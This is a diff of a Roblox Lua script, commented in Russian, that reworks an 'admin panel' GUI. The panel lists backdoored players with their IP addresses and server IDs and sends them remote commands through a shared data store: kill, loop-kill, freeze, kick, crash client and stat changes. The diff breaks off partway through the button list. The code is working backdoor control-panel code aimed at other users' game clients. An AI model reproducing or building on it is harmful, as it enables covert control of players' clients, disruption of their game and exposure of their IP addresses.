+    title.Size = UDim2.new(1, 0, 0, 55)
     title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     title.BackgroundTransparency = 0.3
     title.Text = "👑 АДМИН-ПАНЕЛЬ • 50+ ФУНКЦИЙ"
     title.TextColor3 = Color3.fromRGB(200, 150, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
-    title.Parent = bg
+    title.Parent = frame
     
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 10)
-    titleCorner.Parent = title
+    local tCorner = Instance.new("UICorner")
+    tCorner.CornerRadius = UDim.new(0, 12)
+    tCorner.Parent = title
     
     -- Кнопка закрытия
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0, 35, 0, 35)
-    closeBtn.Position = UDim2.new(1, -45, 0, 7.5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.Text = "✕"
-    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.TextScaled = true
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.Parent = bg
+    local close = Instance.new("TextButton")
+    close.Size = UDim2.new(0, 40, 0, 40)
+    close.Position = UDim2.new(1, -50, 0, 7.5)
+    close.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+    close.Text = "✕"
+    close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    close.TextScaled = true
+    close.Font = Enum.Font.GothamBold
+    close.Parent = frame
     
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 8)
-    closeCorner.Parent = closeBtn
+    local cCorner = Instance.new("UICorner")
+    cCorner.CornerRadius = UDim.new(0, 8)
+    cCorner.Parent = close
     
-    closeBtn.MouseButton1Click:Connect(function()
-        AdminWindow:Destroy()
-        AdminWindow = nil
+    close.MouseButton1Click:Connect(function()
+        adminPanel:Destroy()
+        adminPanel = nil
     end)
     
     -- Вкладки
     local tabContainer = Instance.new("Frame")
-    tabContainer.Size = UDim2.new(1, 0, 0, 40)
-    tabContainer.Position = UDim2.new(0, 0, 0, 50)
+    tabContainer.Size = UDim2.new(1, 0, 0, 45)
+    tabContainer.Position = UDim2.new(0, 0, 0, 55)
     tabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    tabContainer.Parent = bg
+    tabContainer.Parent = frame
     
     -- Контент
     local content = Instance.new("ScrollingFrame")
-    content.Size = UDim2.new(1, -20, 1, -100)
-    content.Position = UDim2.new(0, 10, 0, 100)
+    content.Size = UDim2.new(1, -20, 1, -120)
+    content.Position = UDim2.new(0, 10, 0, 110)
     content.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
     content.BorderSizePixel = 0
-    content.ScrollBarThickness = 4
-    content.ScrollBarImageColor3 = Color3.fromRGB(200, 50, 255)
+    content.ScrollBarThickness = 5
+    content.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 255)
     content.CanvasSize = UDim2.new(0, 0, 0, 0)
     content.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    content.Parent = bg
+    content.Parent = frame
+    
+    local cCorner = Instance.new("UICorner")
+    cCorner.CornerRadius = UDim.new(0, 8)
+    cCorner.Parent = content
     
     local contentLayout = Instance.new("UIListLayout")
     contentLayout.Padding = UDim.new(0, 10)
     contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
     contentLayout.Parent = content
     
-    -- Поиск игроков
+    -- Поиск
     local searchBox = Instance.new("TextBox")
-    searchBox.Size = UDim2.new(1, -20, 0, 35)
+    searchBox.Size = UDim2.new(1, -20, 0, 40)
     searchBox.Position = UDim2.new(0, 10, 0, 5)
-    searchBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    searchBox.PlaceholderText = "🔍 Поиск по имени или ID..."
+    searchBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    searchBox.PlaceholderText = "🔍 Поиск игрока по имени или ID..."
     searchBox.Text = ""
     searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
     searchBox.TextScaled = true
     searchBox.Font = Enum.Font.Gotham
     searchBox.Parent = content
     
-    local searchCorner = Instance.new("UICorner")
-    searchCorner.CornerRadius = UDim.new(0, 5)
-    searchCorner.Parent = searchBox
+    local sCorner = Instance.new("UICorner")
+    sCorner.CornerRadius = UDim.new(0, 8)
+    sCorner.Parent = searchBox
     
-    -- СТАТИСТИКА
+    -- Статистика
     local statsFrame = Instance.new("Frame")
-    statsFrame.Size = UDim2.new(1, -20, 0, 40)
-    statsFrame.Position = UDim2.new(0, 10, 0, 45)
+    statsFrame.Size = UDim2.new(1, -20, 0, 45)
+    statsFrame.Position = UDim2.new(0, 10, 0, 50)
     statsFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
     statsFrame.Parent = content
     
@@ -1178,7 +1673,7 @@ local function createAdminWindow()
     totalLabel.Parent = statsFrame
     
     local sameLabel = Instance.new("TextLabel")
-    sameLabel.Size = UDim2.new(0.33, 0, 1, 0)
+    sameLabel.Size = UDim2.new(0.34, 0, 1, 0)
     sameLabel.Position = UDim2.new(0.33, 0, 0, 0)
     sameLabel.BackgroundTransparency = 1
     sameLabel.Text = "В сервере: 0"
@@ -1188,8 +1683,8 @@ local function createAdminWindow()
     sameLabel.Parent = statsFrame
     
     local backdoorLabel = Instance.new("TextLabel")
-    backdoorLabel.Size = UDim2.new(0.34, 0, 1, 0)
-    backdoorLabel.Position = UDim2.new(0.66, 0, 0, 0)
+    backdoorLabel.Size = UDim2.new(0.33, 0, 1, 0)
+    backdoorLabel.Position = UDim2.new(0.67, 0, 0, 0)
     backdoorLabel.BackgroundTransparency = 1
     backdoorLabel.Text = "Бекдор: 0"
     backdoorLabel.TextColor3 = Color3.fromRGB(255, 100, 255)
@@ -1197,1186 +1692,364 @@ local function createAdminWindow()
     backdoorLabel.Font = Enum.Font.GothamBold
     backdoorLabel.Parent = statsFrame
     
-    -- Функция обновления статистики
-    local function updateStats()
-        local total = 0
-        local same = 0
-        local backdoor = 0
-        
-        for uid, info in pairs(Registry) do
-            if uid ~= tostring(LP.UserId) then
-                total = total + 1
-                if info.same then same = same + 1 end
-                if info.hasBackdoor then backdoor = backdoor + 1 end
-            end
-        end
-        
-        totalLabel.Text = "Всего: " .. total
-        sameLabel.Text = "В сервере: " .. same
-        backdoorLabel.Text = "Бекдор: " .. backdoor
-    end
-    
     -- Функция добавления игрока
-    local function addPlayerToList(uid, info)
+    local function addPlayerCard(uid, info)
         if not info then return end
         
-        local pFrame = Instance.new("Frame")
-        pFrame.Size = UDim2.new(1, -20, 0, 180)
-        pFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-        pFrame.Parent = content
+        local card = Instance.new("Frame")
+        card.Size = UDim2.new(1, -20, 0, 200)
+        card.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+        card.Parent = content
         
-        local pCorner = Instance.new("UICorner")
-        pCorner.CornerRadius = UDim.new(0, 8)
-        pCorner.Parent = pFrame
+        local cardCorner = Instance.new("UICorner")
+        cardCorner.CornerRadius = UDim.new(0, 8)
+        cardCorner.Parent = card
         
         -- Статус
         local status = Instance.new("Frame")
         status.Size = UDim2.new(0, 12, 0, 12)
-        status.Position = UDim2.new(0, 10, 0, 10)
-        status.BackgroundColor3 = info.same and Color3.fromRGB(60, 220, 60) or Color3.fromRGB(220, 60, 60)
-        status.Parent = pFrame
+        status.Position = UDim2.new(0, 15, 0, 15)
+        status.BackgroundColor3 = info.same and Color3.fromRGB(80, 220, 80) or Color3.fromRGB(220, 80, 80)
+        status.Parent = card
         
-        local statusCorner = Instance.new("UICorner")
-        statusCorner.CornerRadius = UDim.new(1, 0)
-        statusCorner.Parent = status
+        local sCorner = Instance.new("UICorner")
+        sCorner.CornerRadius = UDim.new(1, 0)
+        sCorner.Parent = status
         
-        -- Имя и ID
+        -- Имя
         local nameLabel = Instance.new("TextLabel")
         nameLabel.Size = UDim2.new(0.5, 0, 0, 25)
-        nameLabel.Position = UDim2.new(0, 30, 0, 5)
+        nameLabel.Position = UDim2.new(0, 35, 0, 8)
         nameLabel.BackgroundTransparency = 1
         nameLabel.Text = info.name .. (info.hasBackdoor and " [БЕКДОР]" or "")
         nameLabel.TextColor3 = info.hasBackdoor and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 255, 255)
         nameLabel.TextScaled = true
         nameLabel.Font = Enum.Font.GothamBold
         nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-        nameLabel.Parent = pFrame
+        nameLabel.Parent = card
         
+        -- ID
         local idLabel = Instance.new("TextLabel")
         idLabel.Size = UDim2.new(0.5, 0, 0, 20)
-        idLabel.Position = UDim2.new(0.5, 0, 0, 7)
+        idLabel.Position = UDim2.new(0.5, 0, 0, 10)
         idLabel.BackgroundTransparency = 1
-        idLabel.Text = "ID: " .. uid:sub(1, 8) .. "..."
+        idLabel.Text = "ID: " .. uid
         idLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
         idLabel.TextScaled = true
         idLabel.Font = Enum.Font.Gotham
         idLabel.TextXAlignment = Enum.TextXAlignment.Left
-        idLabel.Parent = pFrame
+        idLabel.Parent = card
         
-        -- Место и сервер
+        -- Место
         local placeLabel = Instance.new("TextLabel")
         placeLabel.Size = UDim2.new(0.5, 0, 0, 20)
-        placeLabel.Position = UDim2.new(0, 30, 0, 30)
+        placeLabel.Position = UDim2.new(0, 35, 0, 33)
         placeLabel.BackgroundTransparency = 1
-        placeLabel.Text = "📍 Place: " .. tostring(info.place):sub(1, 8)
+        placeLabel.Text = "📍 Place: " .. tostring(info.place)
         placeLabel.TextColor3 = info.same and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 255, 100)
         placeLabel.TextScaled = true
         placeLabel.Font = Enum.Font.Gotham
         placeLabel.TextXAlignment = Enum.TextXAlignment.Left
-        placeLabel.Parent = pFrame
+        placeLabel.Parent = card
         
+        -- Job ID
         local jobLabel = Instance.new("TextLabel")
         jobLabel.Size = UDim2.new(0.5, 0, 0, 20)
-        jobLabel.Position = UDim2.new(0.5, 0, 0, 30)
+        jobLabel.Position = UDim2.new(0.5, 0, 0, 33)
         jobLabel.BackgroundTransparency = 1
         jobLabel.Text = "🎮 Job: " .. (info.job or "N/A")
         jobLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
         jobLabel.TextScaled = true
         jobLabel.Font = Enum.Font.Gotham
         jobLabel.TextXAlignment = Enum.TextXAlignment.Left
-        jobLabel.Parent = pFrame
+        jobLabel.Parent = card
         
-        -- IP и время
+        -- IP
         local ipLabel = Instance.new("TextLabel")
         ipLabel.Size = UDim2.new(0.5, 0, 0, 20)
-        ipLabel.Position = UDim2.new(0, 30, 0, 50)
+        ipLabel.Position = UDim2.new(0, 35, 0, 53)
         ipLabel.BackgroundTransparency = 1
-        ipLabel.Text = "🌐 IP: " .. (info.ip or "Unknown")
+        local ipData = dbGet("ip_" .. uid)
+        ipLabel.Text = "🌐 IP: " .. (ipData or "Unknown")
         ipLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
         ipLabel.TextScaled = true
         ipLabel.Font = Enum.Font.Gotham
         ipLabel.TextXAlignment = Enum.TextXAlignment.Left
-        ipLabel.Parent = pFrame
+        ipLabel.Parent = card
         
+        -- Время
         local timeLabel = Instance.new("TextLabel")
         timeLabel.Size = UDim2.new(0.5, 0, 0, 20)
-        timeLabel.Position = UDim2.new(0.5, 0, 0, 50)
+        timeLabel.Position = UDim2.new(0.5, 0, 0, 53)
         timeLabel.BackgroundTransparency = 1
         timeLabel.Text = "⏰ " .. os.date("%H:%M:%S", info.time or tick())
         timeLabel.TextColor3 = Color3.fromRGB(150, 150, 255)
         timeLabel.TextScaled = true
         timeLabel.Font = Enum.Font.Gotham
         timeLabel.TextXAlignment = Enum.TextXAlignment.Left
-        timeLabel.Parent = pFrame
+        timeLabel.Parent = card
         
-        -- ==============================================
-        -- 50+ ФУНКЦИЙ ДЛЯ ИГРОКА
-        -- ==============================================
+        -- Контейнер для кнопок (4 ряда по 13 кнопок = 52 функции)
         local btnContainer = Instance.new("Frame")
-        btnContainer.Size = UDim2.new(1, -10, 0, 80)
-        btnContainer.Position = UDim2.new(0, 5, 0, 75)
+        btnContainer.Size = UDim2.new(1, -20, 0, 120)
+        btnContainer.Position = UDim2.new(0, 10, 0, 80)
         btnContainer.BackgroundTransparency = 1
-        btnContainer.Parent = pFrame
+        btnContainer.Parent = card
         
-        local btnLayout = Instance.new("UIGridLayout")
-        btnLayout.CellSize = UDim2.new(0, 70, 0, 25)
-        btnLayout.CellPadding = UDim2.new(0, 3, 0, 3)
-        btnLayout.FillDirection = Enum.FillDirection.Horizontal
-        btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
-        btnLayout.Parent = btnContainer
+        local grid = Instance.new("UIGridLayout")
+        grid.CellSize = UDim2.new(0, 75, 0, 28)
+        grid.CellPadding = UDim2.new(0, 3, 0, 3)
+        grid.FillDirection = Enum.FillDirection.Horizontal
+        grid.HorizontalAlignment = Enum.HorizontalAlignment.Left
+        grid.Parent = btnContainer
         
         local targetPlayer = Players:GetPlayerByUserId(tonumber(uid))
         
-        -- 1. Убить
-        local killBtn = Instance.new("TextButton")
-        killBtn.Size = UDim2.new(0, 70, 0, 25)
-        killBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        killBtn.Text = "💀 Kill"
-        killBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        killBtn.TextScaled = true
-        killBtn.Font = Enum.Font.GothamBold
-        killBtn.Parent = btnContainer
-        killBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "KILL_PLAYER", "")
+        -- Функция создания кнопки
+        local function addBtn(text, color, callback)
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(0, 75, 0, 28)
+            btn.BackgroundColor3 = color
+            btn.Text = text
+            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            btn.TextScaled = true
+            btn.Font = Enum.Font.GothamBold
+            btn.Parent = btnContainer
+            
+            local btnCorner = Instance.new("UICorner")
+            btnCorner.CornerRadius = UDim.new(0, 5)
+            btnCorner.Parent = btn
+            
+            btn.MouseButton1Click:Connect(callback)
+        end
+        
+        -- 1-10: Основные команды
+        addBtn("💀 Kill", Color3.fromRGB(220, 60, 60), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|KILL_PLAYER||" .. tick(), 30)
         end)
         
-        -- 2. Зациклить убийство
-        local loopKillBtn = Instance.new("TextButton")
-        loopKillBtn.Size = UDim2.new(0, 70, 0, 25)
-        loopKillBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
-        loopKillBtn.Text = "🔄 Loop"
-        loopKillBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        loopKillBtn.TextScaled = true
-        loopKillBtn.Font = Enum.Font.GothamBold
-        loopKillBtn.Parent = btnContainer
-        loopKillBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "START_KILL_LOOP", "")
+        addBtn("🔄 Loop", Color3.fromRGB(220, 120, 60), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|START_KILL_LOOP||" .. tick(), 30)
         end)
         
-        -- 3. Стоп луп
-        local stopLoopBtn = Instance.new("TextButton")
-        stopLoopBtn.Size = UDim2.new(0, 70, 0, 25)
-        stopLoopBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-        stopLoopBtn.Text = "⏹️ Stop"
-        stopLoopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        stopLoopBtn.TextScaled = true
-        stopLoopBtn.Font = Enum.Font.GothamBold
-        stopLoopBtn.Parent = btnContainer
-        stopLoopBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "STOP_KILL_LOOP", "")
+        addBtn("⏹️ Stop", Color3.fromRGB(100, 100, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|STOP_KILL_LOOP||" .. tick(), 30)
         end)
         
-        -- 4. Заморозить
-        local freezeBtn = Instance.new("TextButton")
-        freezeBtn.Size = UDim2.new(0, 70, 0, 25)
-        freezeBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 200)
-        freezeBtn.Text = "❄️ Freeze"
-        freezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        freezeBtn.TextScaled = true
-        freezeBtn.Font = Enum.Font.GothamBold
-        freezeBtn.Parent = btnContainer
-        freezeBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "FREEZE_PLAYER", "")
+        addBtn("❄️ Freeze", Color3.fromRGB(60, 120, 220), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|FREEZE_PLAYER||" .. tick(), 30)
         end)
         
-        -- 5. Разморозить
-        local unfreezeBtn = Instance.new("TextButton")
-        unfreezeBtn.Size = UDim2.new(0, 70, 0, 25)
-        unfreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
-        unfreezeBtn.Text = "🔥 Unfreeze"
-        unfreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        unfreezeBtn.TextScaled = true
-        unfreezeBtn.Font = Enum.Font.GothamBold
-        unfreezeBtn.Parent = btnContainer
-        unfreezeBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "UNFREEZE_PLAYER", "")
+        addBtn("🔥 Unfreeze", Color3.fromRGB(220, 160, 60), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|UNFREEZE_PLAYER||" .. tick(), 30)
         end)
         
-        -- 6. Кикнуть
-        local kickBtn = Instance.new("TextButton")
-        kickBtn.Size = UDim2.new(0, 70, 0, 25)
-        kickBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
-        kickBtn.Text = "👢 Kick"
-        kickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        kickBtn.TextScaled = true
-        kickBtn.Font = Enum.Font.GothamBold
-        kickBtn.Parent = btnContainer
-        kickBtn.MouseButton1Click:Connect(function()
-            local reason = "Вы кикнуты администратором"
-            sendBackdoorCommand(uid, "KICK_PLAYER", reason)
+        addBtn("👢 Kick", Color3.fromRGB(200, 80, 80), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|KICK_PLAYER|Вы кикнуты администратором|" .. tick(), 30)
         end)
         
-        -- 7. Кик с причиной
-        local kickReasonBtn = Instance.new("TextButton")
-        kickReasonBtn.Size = UDim2.new(0, 70, 0, 25)
-        kickReasonBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
-        kickReasonBtn.Text = "📝 Kick +"
-        kickReasonBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        kickReasonBtn.TextScaled = true
-        kickReasonBtn.Font = Enum.Font.GothamBold
-        kickReasonBtn.Parent = btnContainer
-        kickReasonBtn.MouseButton1Click:Connect(function()
-            local reason = "Нарушение правил сервера"
-            sendBackdoorCommand(uid, "KICK_PLAYER", reason)
+        addBtn("📝 Kick+", Color3.fromRGB(200, 80, 80), function()
+            local reason = "Нарушение правил"
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|KICK_PLAYER|" .. reason .. "|" .. tick(), 30)
         end)
         
-        -- 8. Следить
-        local spectateBtn = Instance.new("TextButton")
-        spectateBtn.Size = UDim2.new(0, 70, 0, 25)
-        spectateBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 200)
-        spectateBtn.Text = "👁️ Watch"
-        spectateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        spectateBtn.TextScaled = true
-        spectateBtn.Font = Enum.Font.GothamBold
-        spectateBtn.Parent = btnContainer
-        spectateBtn.MouseButton1Click:Connect(function()
+        addBtn("👁️ Watch", Color3.fromRGB(140, 80, 255), function()
             if targetPlayer then
                 Camera.CameraSubject = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character
             end
         end)
         
-        -- 9. ТП к нему
-        local tpToBtn = Instance.new("TextButton")
-        tpToBtn.Size = UDim2.new(0, 70, 0, 25)
-        tpToBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 150)
-        tpToBtn.Text = "📍 ТП к"
-        tpToBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        tpToBtn.TextScaled = true
-        tpToBtn.Font = Enum.Font.GothamBold
-        tpToBtn.Parent = btnContainer
-        tpToBtn.MouseButton1Click:Connect(function()
-            teleportToPlayer(targetPlayer)
-        end)
-        
-        -- 10. ТП ко мне
-        local bringBtn = Instance.new("TextButton")
-        bringBtn.Size = UDim2.new(0, 70, 0, 25)
-        bringBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 50)
-        bringBtn.Text = "📦 Bring"
-        bringBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        bringBtn.TextScaled = true
-        bringBtn.Font = Enum.Font.GothamBold
-        bringBtn.Parent = btnContainer
-        bringBtn.MouseButton1Click:Connect(function()
-            bringPlayer(targetPlayer)
-        end)
-        
-        -- 11. Отключить God Mode
-        local disableGodBtn = Instance.new("TextButton")
-        disableGodBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableGodBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 150)
-        disableGodBtn.Text = "🚫 God"
-        disableGodBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableGodBtn.TextScaled = true
-        disableGodBtn.Font = Enum.Font.GothamBold
-        disableGodBtn.Parent = btnContainer
-        disableGodBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "GODMODE")
-        end)
-        
-        -- 12. Отключить полёт
-        local disableFlightBtn = Instance.new("TextButton")
-        disableFlightBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableFlightBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
-        disableFlightBtn.Text = "🚫 Flight"
-        disableFlightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableFlightBtn.TextScaled = true
-        disableFlightBtn.Font = Enum.Font.GothamBold
-        disableFlightBtn.Parent = btnContainer
-        disableFlightBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "FLIGHT")
-        end)
-        
-        -- 13. Отключить ноклип
-        local disableNoclipBtn = Instance.new("TextButton")
-        disableNoclipBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableNoclipBtn.BackgroundColor3 = Color3.fromRGB(150, 50, 150)
-        disableNoclipBtn.Text = "🚫 Noclip"
-        disableNoclipBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableNoclipBtn.TextScaled = true
-        disableNoclipBtn.Font = Enum.Font.GothamBold
-        disableNoclipBtn.Parent = btnContainer
-        disableNoclipBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "NOCLIP")
-        end)
-        
-        -- 14. Отключить ESP
-        local disableEspBtn = Instance.new("TextButton")
-        disableEspBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableEspBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 100)
-        disableEspBtn.Text = "🚫 ESP"
-        disableEspBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableEspBtn.TextScaled = true
-        disableEspBtn.Font = Enum.Font.GothamBold
-        disableEspBtn.Parent = btnContainer
-        disableEspBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "ESP")
-        end)
-        
-        -- 15. Отключить X-Ray
-        local disableXrayBtn = Instance.new("TextButton")
-        disableXrayBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableXrayBtn.BackgroundColor3 = Color3.fromRGB(150, 100, 255)
-        disableXrayBtn.Text = "🚫 X-Ray"
-        disableXrayBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableXrayBtn.TextScaled = true
-        disableXrayBtn.Font = Enum.Font.GothamBold
-        disableXrayBtn.Parent = btnContainer
-        disableXrayBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "XRAY")
-        end)
-        
-        -- 16. Отключить Aimbot
-        local disableAimbotBtn = Instance.new("TextButton")
-        disableAimbotBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableAimbotBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 150)
-        disableAimbotBtn.Text = "🚫 Aimbot"
-        disableAimbotBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableAimbotBtn.TextScaled = true
-        disableAimbotBtn.Font = Enum.Font.GothamBold
-        disableAimbotBtn.Parent = btnContainer
-        disableAimbotBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "AIMBOT")
-        end)
-        
-        -- 17. Отключить Triggerbot
-        local disableTriggerBtn = Instance.new("TextButton")
-        disableTriggerBtn.Size = UDim2.new(0, 70, 0, 25)
-        disableTriggerBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
-        disableTriggerBtn.Text = "🚫 Trigger"
-        disableTriggerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        disableTriggerBtn.TextScaled = true
-        disableTriggerBtn.Font = Enum.Font.GothamBold
-        disableTriggerBtn.Parent = btnContainer
-        disableTriggerBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "DISABLE_FUNCTION", "TRIGGERBOT")
-        end)
-        
-        -- 18. Установить скорость 1
-        local setSpeed1Btn = Instance.new("TextButton")
-        setSpeed1Btn.Size = UDim2.new(0, 70, 0, 25)
-        setSpeed1Btn.BackgroundColor3 = Color3.fromRGB(100, 150, 200)
-        setSpeed1Btn.Text = "🐢 Speed 1"
-        setSpeed1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        setSpeed1Btn.TextScaled = true
-        setSpeed1Btn.Font = Enum.Font.GothamBold
-        setSpeed1Btn.Parent = btnContainer
-        setSpeed1Btn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SET_WALKSPEED", "1")
-        end)
-        
-        -- 19. Установить скорость 16
-        local setSpeed16Btn = Instance.new("TextButton")
-        setSpeed16Btn.Size = UDim2.new(0, 70, 0, 25)
-        setSpeed16Btn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-        setSpeed16Btn.Text = "⚡ Speed 16"
-        setSpeed16Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        setSpeed16Btn.TextScaled = true
-        setSpeed16Btn.Font = Enum.Font.GothamBold
-        setSpeed16Btn.Parent = btnContainer
-        setSpeed16Btn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SET_WALKSPEED", "16")
-        end)
-        
-        -- 20. Установить скорость 100
-        local setSpeed100Btn = Instance.new("TextButton")
-        setSpeed100Btn.Size = UDim2.new(0, 70, 0, 25)
-        setSpeed100Btn.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
-        setSpeed100Btn.Text = "🚀 Speed 100"
-        setSpeed100Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        setSpeed100Btn.TextScaled = true
-        setSpeed100Btn.Font = Enum.Font.GothamBold
-        setSpeed100Btn.Parent = btnContainer
-        setSpeed100Btn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SET_WALKSPEED", "100")
-        end)
-        
-        -- 21. Установить прыжок 1
-        local setJump1Btn = Instance.new("TextButton")
-        setJump1Btn.Size = UDim2.new(0, 70, 0, 25)
-        setJump1Btn.BackgroundColor3 = Color3.fromRGB(100, 150, 200)
-        setJump1Btn.Text = "🐢 Jump 1"
-        setJump1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        setJump1Btn.TextScaled = true
-        setJump1Btn.Font = Enum.Font.GothamBold
-        setJump1Btn.Parent = btnContainer
-        setJump1Btn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SET_JUMPPOWER", "1")
-        end)
-        
-        -- 22. Установить прыжок 50
-        local setJump50Btn = Instance.new("TextButton")
-        setJump50Btn.Size = UDim2.new(0, 70, 0, 25)
-        setJump50Btn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
-        setJump50Btn.Text = "⚡ Jump 50"
-        setJump50Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        setJump50Btn.TextScaled = true
-        setJump50Btn.Font = Enum.Font.GothamBold
-        setJump50Btn.Parent = btnContainer
-        setJump50Btn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SET_JUMPPOWER", "50")
-        end)
-        
-        -- 23. Установить прыжок 200
-        local setJump200Btn = Instance.new("TextButton")
-        setJump200Btn.Size = UDim2.new(0, 70, 0, 25)
-        setJump200Btn.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
-        setJump200Btn.Text = "🚀 Jump 200"
-        setJump200Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        setJump200Btn.TextScaled = true
-        setJump200Btn.Font = Enum.Font.GothamBold
-        setJump200Btn.Parent = btnContainer
-        setJump200Btn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "SET_JUMPPOWER", "200")
-        end)
-        
-        -- 24. Краш клиента
-        local crashBtn = Instance.new("TextButton")
-        crashBtn.Size = UDim2.new(0, 70, 0, 25)
-        crashBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        crashBtn.Text = "💥 Crash"
-        crashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        crashBtn.TextScaled = true
-        crashBtn.Font = Enum.Font.GothamBold
-        crashBtn.Parent = btnContainer
-        crashBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "CRASH_PLAYER", "")
-        end)
-        
-        -- 25. Черный экран
-        local blackBtn = Instance.new("TextButton")
